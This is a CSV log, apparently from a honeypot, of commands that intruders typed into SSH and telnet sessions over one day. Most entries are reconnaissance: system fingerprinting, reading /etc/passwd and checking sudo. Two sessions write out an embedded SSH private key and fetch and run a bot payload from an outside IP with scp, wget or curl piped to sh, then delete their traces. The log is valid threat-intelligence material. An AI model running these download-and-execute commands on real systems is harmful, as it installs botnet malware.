timestamp,src_ip,session,input,failed
2026-09-05 12:15:48.621552+00:00,195.178.110.217,11a398d87f26,uname -s -v -n -m 2 > /dev/null,False
2026-09-05 12:15:48.623104+00:00,195.178.110.217,11a398d87f26,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-05 12:15:48.624488+00:00,195.178.110.217,11a398d87f26,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-05 12:15:48.627089+00:00,195.178.110.217,11a398d87f26,busybox uname -s -v -n -m 2 > /dev/null,False
2026-09-05 12:15:48.628470+00:00,195.178.110.217,11a398d87f26,busybox uname -s -v -n -m,True
2026-09-05 12:15:48.630001+00:00,195.178.110.217,11a398d87f26,( [ -f /proc/version ],False
2026-09-05 12:15:48.630708+00:00,195.178.110.217,11a398d87f26,[ -f /proc/version ],False
2026-09-05 12:15:48.633582+00:00,195.178.110.217,11a398d87f26,head -1 /proc/version | cut -d -f1,False
2026-09-05 12:15:48.635494+00:00,195.178.110.217,11a398d87f26,[ -f /etc/os-release ],False
2026-09-05 12:26:53.906740+00:00,223.123.72.51,ba578c7f6ddd,start,False
2026-09-05 12:26:53.907654+00:00,223.123.72.51,ba578c7f6ddd,start ,True
2026-09-05 12:26:53.909081+00:00,223.123.72.51,ba578c7f6ddd,enable,False
2026-09-05 12:26:53.909975+00:00,223.123.72.51,ba578c7f6ddd,enable ,True
2026-09-05 12:26:53.911373+00:00,223.123.72.51,ba578c7f6ddd,config terminal,False
2026-09-05 12:26:53.912360+00:00,223.123.72.51,ba578c7f6ddd,config terminal,True
2026-09-05 12:26:53.913608+00:00,223.123.72.51,ba578c7f6ddd,system,False
2026-09-05 12:26:53.914526+00:00,223.123.72.51,ba578c7f6ddd,system ,True
2026-09-05 12:26:53.915674+00:00,223.123.72.51,ba578c7f6ddd,linuxshell,False
2026-09-05 12:26:53.916548+00:00,223.123.72.51,ba578c7f6ddd,linuxshell ,True
2026-09-05 12:26:53.917379+00:00,223.123.72.51,ba578c7f6ddd,su,False
2026-09-05 12:26:53.918871+00:00,223.123.72.51,ba578c7f6ddd,shell,False
2026-09-05 12:26:53.919921+00:00,223.123.72.51,ba578c7f6ddd,shell ,True
2026-09-05 12:26:53.920600+00:00,223.123.72.51,ba578c7f6ddd,sh,False
2026-09-05 12:26:53.930871+00:00,223.123.72.51,ba578c7f6ddd,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4d\x4b\x45\x55\x46\x4b',False
2026-09-05 12:26:53.937126+00:00,223.123.72.51,ba578c7f6ddd,/bin/busybox echo -e \x4d\x4b\x45\x55\x46\x4b,True
2026-09-05 12:27:14.197884+00:00,223.123.72.51,5afab3cd3b41,start,False
2026-09-05 12:27:14.198774+00:00,223.123.72.51,5afab3cd3b41,start ,True
2026-09-05 12:27:14.199699+00:00,223.123.72.51,5afab3cd3b41,enable,False
2026-09-05 12:27:14.200517+00:00,223.123.72.51,5afab3cd3b41,enable ,True
2026-09-05 12:27:14.202158+00:00,223.123.72.51,5afab3cd3b41,config terminal,False
2026-09-05 12:27:14.203758+00:00,223.123.72.51,5afab3cd3b41,config terminal,True
2026-09-05 12:27:14.205524+00:00,223.123.72.51,5afab3cd3b41,system,False
2026-09-05 12:27:14.206671+00:00,223.123.72.51,5afab3cd3b41,system ,True
2026-09-05 12:27:14.208415+00:00,223.123.72.51,5afab3cd3b41,linuxshell,False
2026-09-05 12:27:14.210272+00:00,223.123.72.51,5afab3cd3b41,linuxshell ,True
2026-09-05 12:27:14.211978+00:00,223.123.72.51,5afab3cd3b41,su,False
2026-09-05 12:27:14.214477+00:00,223.123.72.51,5afab3cd3b41,shell,False
2026-09-05 12:27:14.219531+00:00,223.123.72.51,5afab3cd3b41,shell ,True
2026-09-05 12:27:14.222627+00:00,223.123.72.51,5afab3cd3b41,sh,False
2026-09-05 12:27:14.235322+00:00,223.123.72.51,5afab3cd3b41,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4d\x4b\x45\x55\x46\x4b',False
2026-09-05 12:27:14.242455+00:00,223.123.72.51,5afab3cd3b41,/bin/busybox echo -e \x4d\x4b\x45\x55\x46\x4b,True
2026-09-05 13:06:26.718457+00:00,91.92.42.10,a1ea52a37f84,uname -s -v -n -r -m,False
2026-09-05 13:08:30.622075+00:00,91.92.42.10,d8ec3d940202,uname -s -v -n -r -m,False
2026-09-05 13:11:08.209152+00:00,185.93.89.23,9df93ec198bb,uname -a;w,False
2026-09-05 13:44:02.617111+00:00,91.92.42.10,811519617ca9,uname -s -v -n -r -m,False
2026-09-05 14:53:39.990286+00:00,91.92.42.10,ccce5a162a87,uname -s -v -n -r -m,False
2026-09-05 15:05:26.838866+00:00,91.92.42.10,7dd9660521c9,uname -s -v -n -r -m,False
2026-09-05 15:07:21.824792+00:00,91.92.42.10,0ea2f555edd2,uname -s -v -n -r -m,False
2026-09-05 16:41:47.377409+00:00,195.178.110.232,94e9607127f8,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""LAST:$last_output""; echo ""FILTER:$filter_output""",False
2026-09-05 16:41:47.378334+00:00,195.178.110.232,94e9607127f8,uname -s -v -n -m 2 > /dev/null,False
2026-09-05 16:41:47.378929+00:00,195.178.110.232,94e9607127f8,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-05 16:41:47.379495+00:00,195.178.110.232,94e9607127f8,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-05 16:41:47.381079+00:00,195.178.110.232,94e9607127f8,busybox uname -s -v -n -m 2 > /dev/null,False
2026-09-05 16:41:47.382983+00:00,195.178.110.232,94e9607127f8,busybox uname -s -v -n -m,True
2026-09-05 16:41:47.385021+00:00,195.178.110.232,94e9607127f8,( [ -f /proc/version ],False
2026-09-05 16:41:47.386216+00:00,195.178.110.232,94e9607127f8,[ -f /proc/version ],False
2026-09-05 16:41:47.389117+00:00,195.178.110.232,94e9607127f8,head -1 /proc/version | cut -d -f1,False
2026-09-05 16:41:47.391711+00:00,195.178.110.232,94e9607127f8,[ -f /etc/os-release ],False
2026-09-05 19:15:52.003321+00:00,172.184.210.33,80150252d393,sudo -n whoami,False
2026-09-05 19:15:52.698514+00:00,172.184.210.33,80150252d393,sudo -S whoami,False
2026-09-05 19:53:07.536142+00:00,8.216.46.15,39b543f68cc5,id,False
2026-09-05 19:53:07.539917+00:00,8.216.46.15,39b543f68cc5,cat /etc/passwd,False
2026-09-05 19:53:07.546481+00:00,8.216.46.15,39b543f68cc5,"echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",False
2026-09-05 19:53:10.608123+00:00,8.216.46.15,39b543f68cc5,enable,False
2026-09-05 19:53:10.609869+00:00,8.216.46.15,39b543f68cc5,enable ,True
2026-09-05 19:53:10.611332+00:00,8.216.46.15,39b543f68cc5,system,False
2026-09-05 19:53:10.612770+00:00,8.216.46.15,39b543f68cc5,system ,True
2026-09-05 19:53:10.614229+00:00,8.216.46.15,39b543f68cc5,shell,False
2026-09-05 19:53:10.615889+00:00,8.216.46.15,39b543f68cc5,shell ,True
2026-09-05 19:53:10.617586+00:00,8.216.46.15,39b543f68cc5,sh,False
2026-09-05 19:53:10.623228+00:00,8.216.46.15,39b543f68cc5,bash,False
2026-09-05 19:53:10.637307+00:00,8.216.46.15,39b543f68cc5,cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----,False
2026-09-05 19:53:10.651083+00:00,8.216.46.15,39b543f68cc5,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW,False
2026-09-05 19:53:10.652916+00:00,8.216.46.15,39b543f68cc5,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW ,True
2026-09-05 19:53:10.656200+00:00,8.216.46.15,39b543f68cc5,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ,False
2026-09-05 19:53:10.657289+00:00,8.216.46.15,39b543f68cc5,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ ,True
2026-09-05 19:53:10.660611+00:00,8.216.46.15,39b543f68cc5,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg,False
2026-09-05 19:53:10.661730+00:00,8.216.46.15,39b543f68cc5,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg ,True
2026-09-05 19:53:10.664820+00:00,8.216.46.15,39b543f68cc5,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9,False
2026-09-05 19:53:10.671235+00:00,8.216.46.15,39b543f68cc5,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9 ,True
2026-09-05 19:53:10.678901+00:00,8.216.46.15,39b543f68cc5,Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=,False
2026-09-05 19:53:10.692224+00:00,8.216.46.15,39b543f68cc5,-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no,False
2026-09-05 19:53:10.694311+00:00,8.216.46.15,39b543f68cc5,-----END OPENSSH PRIVATE KEY----- > key.ppk; echo StrictHostKeyChecking no,True
2026-09-05 19:53:10.717496+00:00,8.216.46.15,39b543f68cc5,"UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e ""\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B""",False
2026-09-05 19:53:10.719693+00:00,8.216.46.15,39b543f68cc5,,False
2026-09-05 21:34:04.317700+00:00,47.77.183.211,72282a531430,USER test,False
2026-09-05 21:34:04.318972+00:00,47.77.183.211,72282a531430,USER test,True
2026-09-05 21:34:05.316746+00:00,47.77.183.211,72282a531430,USER test,False
2026-09-05 21:34:05.318423+00:00,47.77.183.211,72282a531430,USER test,True
2026-09-05 21:34:06.314941+00:00,47.77.183.211,72282a531430,USER test,False
2026-09-05 21:34:06.316331+00:00,47.77.183.211,72282a531430,USER test,True
2026-09-05 21:34:07.315848+00:00,47.77.183.211,72282a531430,USER test,False
2026-09-05 21:34:07.316852+00:00,47.77.183.211,72282a531430,USER test,True
2026-09-05 21:34:50.981715+00:00,153.117.9.72,48cfa418e76f,start,False
2026-09-05 21:34:50.983426+00:00,153.117.9.72,48cfa418e76f,start ,True
2026-09-05 21:34:50.985395+00:00,153.117.9.72,48cfa418e76f,enable,False
2026-09-05 21:34:50.987106+00:00,153.117.9.72,48cfa418e76f,enable ,True
2026-09-05 21:34:50.990229+00:00,153.117.9.72,48cfa418e76f,config terminal,False
2026-09-05 21:34:50.991495+00:00,153.117.9.72,48cfa418e76f,config terminal,True
2026-09-05 21:34:50.992618+00:00,153.117.9.72,48cfa418e76f,system,False
2026-09-05 21:34:50.994431+00:00,153.117.9.72,48cfa418e76f,system ,True
2026-09-05 21:34:50.996822+00:00,153.117.9.72,48cfa418e76f,linuxshell,False
2026-09-05 21:34:50.998431+00:00,153.117.9.72,48cfa418e76f,linuxshell ,True
2026-09-05 21:34:51.000075+00:00,153.117.9.72,48cfa418e76f,su,False
2026-09-05 21:34:51.003082+00:00,153.117.9.72,48cfa418e76f,shell,False
2026-09-05 21:34:51.004352+00:00,153.117.9.72,48cfa418e76f,shell ,True
2026-09-05 21:34:51.005469+00:00,153.117.9.72,48cfa418e76f,sh,False
2026-09-05 21:34:51.019883+00:00,153.117.9.72,48cfa418e76f,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4e\x59\x54\x5a\x4a\x58',False
2026-09-05 21:34:51.029325+00:00,153.117.9.72,48cfa418e76f,/bin/busybox echo -e \x4e\x59\x54\x5a\x4a\x58,True
2026-09-05 21:36:54.490669+00:00,47.77.186.7,39d762ee7dec,USER test,False
2026-09-05 21:36:54.492098+00:00,47.77.186.7,39d762ee7dec,USER test,True
2026-09-05 21:36:55.490824+00:00,47.77.186.7,39d762ee7dec,USER test,False
2026-09-05 21:36:55.492092+00:00,47.77.186.7,39d762ee7dec,USER test,True
2026-09-05 21:36:56.492238+00:00,47.77.186.7,39d762ee7dec,USER test,False
2026-09-05 21:36:56.496463+00:00,47.77.186.7,39d762ee7dec,USER test,True
2026-09-05 21:36:57.492936+00:00,47.77.186.7,39d762ee7dec,USER test,False
2026-09-05 21:36:57.494149+00:00,47.77.186.7,39d762ee7dec,USER test,True
2026-09-05 21:48:42.339734+00:00,130.12.180.51,08e531557334,"uname -a; echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh",False
2026-09-05 22:01:42.508230+00:00,172.184.210.33,fe9b1a545d7d,sudo -n whoami,False
2026-09-05 22:01:43.278937+00:00,172.184.210.33,fe9b1a545d7d,sudo -S whoami,False
2026-09-05 22:47:00.955174+00:00,91.92.42.34,991e9b29ea51,uname -s -v -n -r -m,False
2026-09-05 23:01:12.670648+00:00,103.73.101.172,51f428a6f59e,start,False
2026-09-05 23:01:12.671905+00:00,103.73.101.172,51f428a6f59e,start ,True
2026-09-05 23:01:12.673329+00:00,103.73.101.172,51f428a6f59e,enable,False
2026-09-05 23:01:12.674616+00:00,103.73.101.172,51f428a6f59e,enable ,True
2026-09-05 23:01:12.676007+00:00,103.73.101.172,51f428a6f59e,config terminal,False
2026-09-05 23:01:12.676858+00:00,103.73.101.172,51f428a6f59e,config terminal,True
2026-09-05 23:01:12.677953+00:00,103.73.101.172,51f428a6f59e,system,False
2026-09-05 23:01:12.678907+00:00,103.73.101.172,51f428a6f59e,system ,True
2026-09-05 23:01:12.680179+00:00,103.73.101.172,51f428a6f59e,linuxshell,False
2026-09-05 23:01:12.681170+00:00,103.73.101.172,51f428a6f59e,linuxshell ,True
2026-09-05 23:01:12.681924+00:00,103.73.101.172,51f428a6f59e,su,False
2026-09-05 23:01:12.683755+00:00,103.73.101.172,51f428a6f59e,shell,False
2026-09-05 23:01:12.684674+00:00,103.73.101.172,51f428a6f59e,shell ,True
2026-09-05 23:01:12.685915+00:00,103.73.101.172,51f428a6f59e,sh,False
2026-09-05 23:01:12.698806+00:00,103.73.101.172,51f428a6f59e,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x5a\x59\x41\x48\x4b\x44',False
2026-09-05 23:01:12.706760+00:00,103.73.101.172,51f428a6f59e,/bin/busybox echo -e \x5a\x59\x41\x48\x4b\x44,True
2026-09-05 23:15:18.029905+00:00,91.92.42.34,5abf7552e855,uname -s -v -n -r -m,False
2026-09-05 23:21:57.601018+00:00,124.174.39.136,9789666e54ad,uname -s -m,False
2026-09-05 23:39:10.098229+00:00,91.92.42.34,34c9cb0ab4d0,uname -s -v -n -r -m,False
2026-09-05 23:56:51.507898+00:00,91.92.42.34,3e13240ac8e7,uname -s -v -n -r -m,False
